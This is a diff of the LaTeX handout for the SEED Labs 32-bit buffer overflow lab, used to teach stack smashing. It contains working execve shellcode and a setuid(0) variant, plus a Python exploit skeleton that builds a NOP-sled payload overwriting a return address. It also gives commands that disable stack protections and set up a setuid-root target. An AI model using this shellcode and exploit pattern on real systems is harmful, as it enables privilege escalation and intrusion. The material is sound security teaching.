@@ -11,22 +11,17 @@
 
 \newcommand{\bufFigs}{./Figs}
 
-\lhead{\bfseries SEED Labs -- Buffer Overflow Vulnerability Lab}
+\lhead{\bfseries SEED Labs -- Buffer Overflow Vulnerability Lab (32-bit)}
 
 \def \code#1 {\fbox{\scriptsize{\texttt{#1}}}}
 
 \begin{document}
 
 \begin{center}
-{\LARGE Buffer Overflow Vulnerability Lab}
-
-\vspace{0.05in}
-Updated on January 11, 2020
+{\LARGE Buffer Overflow Vulnerability Lab (32-bit)}
 \end{center}
 
 \seedlabcopyright{2006 - 2016}
-
-
 
 
 % *******************************************
@@ -99,7 +94,7 @@ Detailed coverage of the buffer-overflow attack can be found in the following:
 % *******************************************
 % SECTION
 % ******************************************* 
-\section{Lab Tasks}
+\section{Environment Setup}
 
 % -------------------------------------------
 % SUBSECTION
@@ -131,11 +126,13 @@ The GCC compiler implements a security mechanism called
 protection, buffer overflow attacks will not work. We can disable this
 protection during the compilation using the 
 \emph{-fno-stack-protector} option. For example, to compile a program
-\texttt{example.c} with StackGuard disabled, we can do the following:
+\texttt{example.c} with StackGuard disabled, we can do the following (the
+\texttt{-m32} flag indicates we want to compile this program into
+32-bit binary, instead of 64-bit):
 
 
 \begin{lstlisting}
-$ gcc -fno-stack-protector example.c
+$ gcc -m32 -fno-stack-protector example.c
 \end{lstlisting}
 
 
@@ -152,16 +149,16 @@ To change that, use the following option when compiling programs:
 
 \begin{lstlisting}
 For executable stack:
-$ gcc -z execstack  -o test test.c
+$ gcc -m32 -z execstack  -o test test.c
 
 For non-executable stack:
-$ gcc -z noexecstack  -o test test.c
+$ gcc -m32 -z noexecstack  -o test test.c
 \end{lstlisting}
 
 
 
-\paragraph{Configuring \texttt{/bin/sh} (Ubuntu 16.04 VM only).} In both Ubuntu 12.04 and 
-Ubuntu 16.04 VMs, the \texttt{/bin/sh} symbolic link points to
+\paragraph{Configuring \texttt{/bin/sh}.} In the Ubuntu 20.04 OS,
+the \texttt{/bin/sh} symbolic link points to
 the \texttt{/bin/dash} shell. However, the \texttt{dash} program 
 in these two VMs have an important difference. 
 The \texttt{dash} shell in Ubuntu 16.04 has a countermeasure
@@ -169,8 +166,7 @@ that prevents itself from being executed in a \setuid process.
 Basically, if \texttt{dash} detects that it is 
 executed in a \setuid process, it immediately 
 changes the effective user ID to the process's real user ID, essentially
-dropping the privilege. The \texttt{dash} program in Ubuntu 12.04 does not have this 
-behavior.    
+dropping the privilege. 
 
 
 Since our victim program is a \setuid program, and our 
@@ -180,21 +176,18 @@ we will link \texttt{/bin/sh} to another shell that does not
 have such a countermeasure (in later tasks, we will show that with
 a little bit more effort, the countermeasure in \texttt{/bin/dash}
 can be easily defeated). We have installed a shell program 
-called \texttt{zsh} in our Ubuntu 16.04 VM. We use the following
-commands to link \texttt{/bin/sh} to \texttt{zsh} (there is no need to do these in Ubuntu
-12.04):  
-
+called \texttt{zsh} in our Ubuntu 20.04 VM. We use the following
+commands to link \texttt{/bin/sh} to \texttt{zsh}:
 
 \begin{lstlisting}
 $ sudo ln -sf /bin/zsh /bin/sh
 \end{lstlisting}
 
 
-
-% -------------------------------------------
-% SUBSECTION
-% ------------------------------------------- 
-\subsection{Task 1: Running Shellcode}
+% *******************************************
+% SECTION
+% ******************************************* 
+\section{Task 1: Running Shellcode}
 
 
 Before starting the attack, let us get familiar with the shellcode. A shellcode is the code to
@@ -224,65 +217,74 @@ we have a separate SEED lab for that purpose.
 
 \begin{lstlisting}
 /* call_shellcode.c: You can get it from the lab's website */
-
-/* A program that launches a shell using shellcode */
+/* Launches a shell using shellcode */
 #include <stdlib.h>
 #include <stdio.h>
 #include <string.h>
 
-const char code[] =
-  "\x31\xc0"         /* Line 1:  xorl    %eax,%eax              */
-  "\x50"             /* Line 2:  pushl   %eax                   */
-  "\x68""//sh"       /* Line 3:  pushl   $0x68732f2f            */
-  "\x68""/bin"       /* Line 4:  pushl   $0x6e69622f            */
-  "\x89\xe3"         /* Line 5:  movl    %esp,%ebx              */
-  "\x50"             /* Line 6:  pushl   %eax                   */
-  "\x53"             /* Line 7:  pushl   %ebx                   */
-  "\x89\xe1"         /* Line 8:  movl    %esp,%ecx              */
-  "\x99"             /* Line 9:  cdq                            */
-  "\xb0\x0b"         /* Line 10: movb    $0x0b,%al              */
-  "\xcd\x80"         /* Line 11: int     $0x80                  */
+const char shellcode[] =
+  "\x31\xc0"         /* Line 1:  xor  eax, eax      */
+  "\x50"             /* Line 2:  push eax           */
+  "\x68""//sh"       /* Line 3:  push "//sh"        */
+  "\x68""/bin"       /* Line 4:  push "//sh"        */
+  "\x89\xe3"         /* Line 5:  mov  ebx, esp      */
+  "\x50"             /* Line 6:  push eax           */
+  "\x53"             /* Line 7:  push ebx           */
+  "\x89\xe1"         /* Line 8:  mov  ecx, esp      */
+  "\x31\xd2"         /* Line 9:  xor  edx, edx      */
+  "\x31\xc0"         /* Line 10: xor  eax, eax      */
+  "\xb0\x0b"         /* Line 11: mov  al,  0x0b     */
+  "\xcd\x80"         /* Line 12: int  0x80          */
 ;
 
 int main(int argc, char **argv)
 {
-   char buf[sizeof(code)];
-   strcpy(buf, code);
+   char buf[sizeof(shellcode)];
+   strcpy(buf, shellcode);
    ((void(*)( ))buf)( );
 } 
 \end{lstlisting}
  
 
-Compile the code above using the following \texttt{gcc} command. Run the program
+Compile the code above using the following \texttt{gcc} command (with the 
+\texttt{-m32} flag for 32-bit binary). Run the program
 and describe your observations. 
 Please do not forget to use the {\tt execstack} option, which allows 
 code to be executed from the stack; without this option, the program will fail.
 
 
 \begin{lstlisting}
-$ gcc -z execstack -o call_shellcode call_shellcode.c
+$ gcc -m32 -z execstack -o call_shellcode call_shellcode.c
 \end{lstlisting}
 
+The shellcode above basically invokes the \texttt{execve()} system call 
+to execute \texttt{/bin/sh}.
+Detailed explanation of the shellcode can be found from the SEED book. 
+In a separate SEED lab, the Shellcode lab, we guide students to write 
+shellcode from scratch. Here we only give a very brief explanation. 
+\begin{itemize}
+\item The third instruction pushes \texttt{"//sh"}, rather than \texttt{"/sh"} into the 
+stack. This is because we need a 32-bit number here, and \texttt{"/sh"} 
+has only 24 bits. Fortunately, \texttt{"//"} is equivalent to \texttt{"/"}, so we can get 
+away with a double slash symbol. 
 
-The shellcode above invokes the \texttt{execve()} system call to execute \texttt{/bin/sh}.
-A few places in this shellcode are worth mentioning. First, 
-the third instruction pushes "//sh", rather than "/sh" into the 
-stack. This is because we need a 32-bit number here, and "/sh" 
-has only 24 bits. Fortunately, "//" is equivalent to ``/'', so we can get 
-away with a double slash symbol. Second, before calling the {\tt execve()}
+\item Before calling the {\tt execve()}
 system call, we need to store {\tt name[0]} (the address of the string), 
 {\tt name} (the address of the array), and {\tt NULL} to
-the {\tt \%ebx}, {\tt \%ecx}, and {\tt \%edx} registers, respectively. 
-Line 5 stores {\tt name[0]} to {\tt \%ebx}; 
-Line 8 stores {\tt name} to    {\tt \%ecx}; 
-Line 9 sets {\tt \%edx} to zero. There are other ways to set {\tt \%edx}
-to zero (e.g., {\tt xorl \%edx, \%edx}); the one ({\tt cdq}) used here
-is simply a shorter instruction: it copies the sign (bit 31) of the value in the EAX
-register (which is 0 at this point) into every bit position in the EDX
-register, basically setting {\tt \%edx} to 0.
-Third, the system call {\tt execve()} is called when we set {\tt \%al} to
-11, and execute ``{\tt int \$0x80}''.
+the {\tt ebx}, {\tt ecx}, and {\tt edx} registers, respectively. 
+Line 5 stores {\tt name[0]} to {\tt ebx}; 
+Line 8 stores {\tt name} to    {\tt ecx}; 
+Line 9 sets {\tt edx} to zero. 
 
+\item The system call {\tt execve()} is called when we set {\tt al} to
+11, and execute {\tt "int 0x80"}.
+\end{itemize}
+
+
+% *******************************************
+% SECTION
+% ******************************************* 
+\section{Task 2: Launching Buffer-Overflow Attack}
 
 
 % -------------------------------------------
@@ -369,7 +371,7 @@ off.
 
 \begin{lstlisting}
 // Note: N should be replaced by the value set by the instructor
-$ gcc -DBUF_SIZE=N -o stack -z execstack -fno-stack-protector stack.c
+$ gcc -DBUF_SIZE=N -m32 -o stack -z execstack -fno-stack-protector stack.c
 $ sudo chown root stack          (*@\ding{192}@*)
 $ sudo chmod 4755 stack          (*@\ding{193}@*)
 \end{lstlisting}
@@ -387,39 +389,144 @@ When this value changes, the layout of the stack
 will change, and the solution will be different.
 
 
+% -------------------------------------------
+% SUBSECTION
+% ------------------------------------------- 
+\subsection{Task 2.1: Investigation} 
+
+To exploit the buffer-overflow vulnerability in the target program,
+the most important thing to know is the distance between the 
+buffer's starting position and the place where the return-address
+is stored. We will use a debugging method to find it out.
+Since we have the source code of the target program, we
+can compile it with the debugging flag turned on. That will make it more
+convenient to debug. Here is the \texttt{gcc} command.
+
+\begin{lstlisting}
+$ gcc -m32 -DBUF_SIZE=N -z execstack -fno-stack-protector  \
+      -g -o stack_dbg stack.c
+\end{lstlisting}
+
+In addition to disabling two countermeasures as before, the above compilation
+uses the \texttt{-g} flag to compile the program, so debugging information
+is added to the binary.  The compiled program (\texttt{stack\textunderscore dbg}) is
+then debugged using \texttt{gdb}. We need to create a file called
+\texttt{badfile} before running the program. 
+
+\begin{lstlisting}
+$ touch badfile     (*@\reflectbox{\ding{217}} \textbf{Create an empty badfile}@*)
+$ gdb stack_dbg
+gdb-peda$ b bof     (*@\reflectbox{\ding{217}} \textbf{Set a break point at function bof()}@*)
+Breakpoint 1 at 0x124d: file stack.c, line 18.
+gdb-peda$ run       (*@\reflectbox{\ding{217}} \textbf{Start executing the program}@*)
+...
+Breakpoint 1, bof (str=0xffffcf57 ...) at stack.c:18
+18  {
+gdb-peda$ next      (*@\reflectbox{\ding{217}} \textbf{See the note below}@*)
+...
+22	    strcpy(buffer, str);
+gdb-peda$ p $ebp    (*@\reflectbox{\ding{217}} \textbf{Get the ebp value}@*)
+$1 = (void *) 0xffffdfd8   
+gdb-peda$ p &buffer (*@\reflectbox{\ding{217}} \textbf{Get the buffer's address}@*)
+$2 = (char (*)[100]) 0xffffdfac
+gdb-peda$ quit      (*@\reflectbox{\ding{217}} \textbf{exit}@*)
+\end{lstlisting}
+
+\paragraph{Note.} When the GDB stops inside the \texttt{bof()} function, it 
+stops before the \texttt{ebp} register is modified
+to point the current stack frame, so if we print out the value of 
+\texttt{ebp} here, we will get the caller's \texttt{ebp} value. We need to use 
+\texttt{next} to execute a few instructions and stop 
+after the \texttt{ebp} register is modified to point to the stack
+frame of the \texttt{bof()} function. 
+The SEED book is based on Ubuntu 16.04, and the GDB's behavior is slightly
+different, so the book does not have the \texttt{next} step. 
 
 % -------------------------------------------
 % SUBSECTION
 % ------------------------------------------- 
-\subsection{Task 2: Exploiting the Vulnerability} 
+\subsection{Task 2.2: Write Exploit Code and Launch Attack} 
 
+To exploit the buffer-overflow vulnerability in the target program,
+we need to prepare a payload, and save it inside \texttt{badfile}. 
+We will use programs to do that.
+We provide two code skeletons for students, a Python program and a C program.
+Students can choose either of them. 
+The shellcode is already provided in the code. 
+The code is incomplete, and students need to replace some of the essential 
+values in the code. 
 
-We provide you with a partially completed exploit code called 
-\texttt{"exploit.c"}. The goal of this code is to construct contents 
+\paragraph{Python Version.} This Python skeleton code 
+is called \texttt{exploit.py}, which
+can be downloaded from the lab's website.
+
+\begin{lstlisting}
+#!/usr/bin/python3
+import sys
+
+shellcode= (
+  "\x31\xc0"    # xor   eax, eax
+  "\x50"        # push  eax
+  "\x68""//sh"  # push  0x68732f2f
+  "\x68""/bin"  # push  0x6e69622f
+  "\x89\xe3"    # mov   ebx, esp
+  "\x50"        # push  eax
+  "\x53"        # push  ebx
+  "\x89\xe1"    # mov   ecx, esp
+  "\x31\xd2"    # xor   edx, edx 
+  "\x31\xc0"    # xor   eax, eax 
+  "\xb0\x0b"    # mov   al, 0x0b
+  "\xcd\x80"    # int   0x80
+).encode('latin-1')
+
+# Fill the content with NOP's
+content = bytearray(0x90 for i in range(517))
+
+# Put the shellcode at the end
+start = 517 - len(shellcode)
+content[start:] = shellcode
+
+#########################################################################
+ret    = 0xAABBCCDD   # replace 0xAABBCCDD with the correct value
+offset = 0            # replace 0 with the correct value
+
+# Fill the return address field with the address of the shellcode
+content[offset:offset + 4] = (ret).to_bytes(4,byteorder='little')
+#########################################################################
+
+# Write the content to badfile
+with open('badfile', 'wb') as f:
+  f.write(content)
+\end{lstlisting}
+
+After you finish the above program, run it. This will generate
+the contents for \texttt{badfile}. Then run the vulnerable 
+program {\tt stack}. If your exploit is implemented correctly, you should 
+be able to get a root shell:  
+
+\begin{lstlisting}
+$./exploit.py     // create the badfile
+$./stack          // launch the attack by running the vulnerable program
+# <---- Bingo! You've got a root shell! 
+\end{lstlisting}
+ 
+
+\paragraph{C version.}
+The C version of the exploit code is called 
+\texttt{"exploit.c"}. Its code is to construct contents 
 for \texttt{badfile}. In this code, the shellcode is given to you. 
 You need to develop the rest. 
 
 
 \begin{lstlisting}
 /* exploit.c  */
-
 /* A program that creates a file containing code for launching shell */
 #include <stdlib.h>
 #include <stdio.h>
 #include <string.h>
 
 char shellcode[] =
-  "\x31\xc0"         /* Line 1:  xorl    %eax,%eax              */
-  "\x50"             /* Line 2:  pushl   %eax                   */
-  "\x68""//sh"       /* Line 3:  pushl   $0x68732f2f            */
-  "\x68""/bin"       /* Line 4:  pushl   $0x6e69622f            */
-  "\x89\xe3"         /* Line 5:  movl    %esp,%ebx              */
-  "\x50"             /* Line 6:  pushl   %eax                   */
-  "\x53"             /* Line 7:  pushl   %ebx                   */
-  "\x89\xe1"         /* Line 8:  movl    %esp,%ecx              */
-  "\x99"             /* Line 9:  cdq                            */
-  "\xb0\x0b"         /* Line 10: movb    $0x0b,%al              */
-  "\xcd\x80"         /* Line 11: int     $0x80                  */
+  ... omitted: same as that in call_shellcode.c ...
 ;							        
 
 void main(int argc, char **argv)
@@ -440,19 +547,10 @@ void main(int argc, char **argv)
 }
 \end{lstlisting}
  
-
 After you finish the above program, compile and run it. This will generate
 the contents for \texttt{badfile}. Then run the vulnerable 
 program {\tt stack}. If your exploit is implemented correctly, you should 
 be able to get a root shell:  
-
-\paragraph{Important:} Please compile your vulnerable program
-first. Please note that the program \texttt{exploit.c}, which generates the \texttt{badfile}, 
-can be compiled with the default StackGuard protection
-enabled. This is because we are not going to overflow the buffer in
-this program. We will be overflowing the buffer in stack.c, which is
-compiled with the StackGuard protection disabled.
-
 
 \begin{lstlisting}
 $ gcc -o exploit exploit.c
@@ -461,80 +559,11 @@ $./stack          // launch the attack by running the vulnerable program
 # <---- Bingo! You've got a root shell! 
 \end{lstlisting}
 
-It should be noted that although you have obtained the ``\#'' prompt, 
-your real user id is still yourself (the effective user id is now
-root). You can check this by typing the following:
 
-
-\begin{lstlisting}
-# id
-uid=(500) euid=0(root)
-\end{lstlisting}
-
-
-Many commands will behave differently if they are executed as 
-\setuid\ {\tt root} processes, instead of just as {\tt root} processes, 
-because they 
-recognize that the real user id is not {\tt root}.  To solve this problem,
-you can run the following program to turn the real user id to
-{\tt root}. This way, you will have a real {\tt root} process, which
-is more powerful.
-  
-\begin{lstlisting}
-void main()
-{ 
-   setuid(0);  system("/bin/sh");
-}
-\end{lstlisting}
-
-
-\paragraph{Python Version.} For students who are more familiar with Python than C, we have 
-provided a Python version of the above C code. The program is called \texttt{exploit.py}, which
-can be downloaded from the lab's website. Students need to replace some of the values
-in the code with the correct ones. 
-
-
-\begin{lstlisting}
-#!/usr/bin/python3
-
-import sys
-
-shellcode= (
-    "\x31\xc0"             # xorl    %eax,%eax              
-    "\x50"                 # pushl   %eax                   
-    "\x68""//sh"           # pushl   $0x68732f2f            
-    "\x68""/bin"           # pushl   $0x6e69622f            
-    "\x89\xe3"             # movl    %esp,%ebx              
-    "\x50"                 # pushl   %eax                   
-    "\x53"                 # pushl   %ebx                   
-    "\x89\xe1"             # movl    %esp,%ecx              
-    "\x99"                 # cdq                            
-    "\xb0\x0b"             # movb    $0x0b,%al              
-    "\xcd\x80"             # int     $0x80                  
-    "\x00"
-).encode('latin-1')
-
-# Fill the content with NOP's
-content = bytearray(0x90 for i in range(517))
-
-# Put the shellcode at the end
-start = 517 - len(shellcode)
-content[start:] = shellcode
-
-#########################################################################
-ret    = 0xAABBCcDD   # replace 0xAABBCCDD with the correct value
-offset = 0            # replace 0 with the correct value
-
-# Fill the return address field with the address of the shellcode
-content[offset:offset + 4] = (ret).to_bytes(4,byteorder='little')
-#########################################################################
-
-# Write the content to badfile
-with open('badfile', 'wb') as f:
-  f.write(content)
-\end{lstlisting}
-
- 
+% *******************************************
+% SECTION
+% ******************************************* 
+\section{Tasks 3 and 4: Defeating Countermeasures}
 
 % -------------------------------------------
 % SUBSECTION
@@ -619,7 +648,7 @@ The above program can be compiled and set up using the following
 commands (we need to make it root-owned \setuid program):
 
 \begin{lstlisting}
-$ gcc dash_shell_test.c -o dash_shell_test
+$ gcc -m32 dash_shell_test.c -o dash_shell_test
 $ sudo chown root dash_shell_test
 $ sudo chmod 4755 dash_shell_test
 \end{lstlisting}
@@ -630,37 +659,23 @@ From the above experiment, we will see that
 code for invoking this system call at the beginning of our shellcode, before 
 we invoke \texttt{execve()}. 
 
-
 \begin{lstlisting}
-char shellcode[] =
-  "\x31\xc0"            /* Line 1: xorl     %eax,%eax   */
-  "\x31\xdb"            /* Line 2: xorl     %ebx,%ebx   */
-  "\xb0\xd5"            /* Line 3: movb     $0xd5,%al   */
-  "\xcd\x80"            /* Line 4: int      $0x80       */
- // ---- The code below is the same as the one in Task 2 ---
-  "\x31\xc0"         
-  "\x50"             
-  "\x68""//sh"       
-  "\x68""/bin"       
-  "\x89\xe3"         
-  "\x50"             
-  "\x53"             
-  "\x89\xe1"         
-  "\x99"             
-  "\xb0\x0b"         
-  "\xcd\x80"         
+shellcode= (
+  "\x31\xc0"    # xor eax, eax  (eax = 0)
+  "\x31\xdb"    # xor ebx, ebx  (ebx = 0)
+  "\xb0\xd5"    # mov al,  0xd5 (0xd5 is setuid()'s system call number)
+  "\xcd\x80"    # int 0x80      (invoke setuid(0))
+  # ---- The code below is the same as the one in Task 2 ---
+  ... omitted ...
+).encode('latin-1')
 \end{lstlisting}
 
 
-The updated shellcode adds 4 instructions: (1) set \texttt{ebx} to zero in Line 2, (2) set
-\texttt{eax} to \texttt{0xd5} via Line 1 and 3 (\texttt{0xd5} 
-is \texttt{setuid()}'s system call number), and (3) execute the
-system call in Line 4. Using this shellcode, we can attempt the attack on the vulnerable
+Using this updated shellcode, we can attempt the attack on the vulnerable
 program when \texttt{/bin/sh} is linked to \texttt{/bin/dash}. Using the above shellcode 
-to modify \texttt{exploit.c} or \texttt{exploit.py}; try the attack from Task 2 again and see
+to modify \texttt{exploit.py} or \texttt{exploit.c}; try the attack from Task 2 again and see
 if you can get a root shell. 
 Please describe and explain your results.
-
 
 
 % -------------------------------------------
@@ -709,6 +724,11 @@ done
 
 
 
+% *******************************************
+% SECTION
+% ******************************************* 
+\section{Tasks 5 and 6: Experimenting with Other Countermeasures}
+
 % -------------------------------------------
 % SUBSECTION
 % ------------------------------------------- 
@@ -734,6 +754,9 @@ you use a older GCC version, you may not have to disable StackGuard.
 
 
 
+% -------------------------------------------
+% SUBSECTION
+% ------------------------------------------- 
 \subsection{Task 6: Turn on the Non-executable Stack Protection}
 
 Before working on this task, remember to turn off the address
@@ -750,7 +773,7 @@ in your lab report. You can use the following instructions to turn
 on the non-executable stack protection.
 
 \begin{lstlisting}
-$ gcc -o stack -fno-stack-protector -z noexecstack stack.c
+$ gcc -m32 -o stack -fno-stack-protector -z noexecstack stack.c
 \end{lstlisting}
 
 
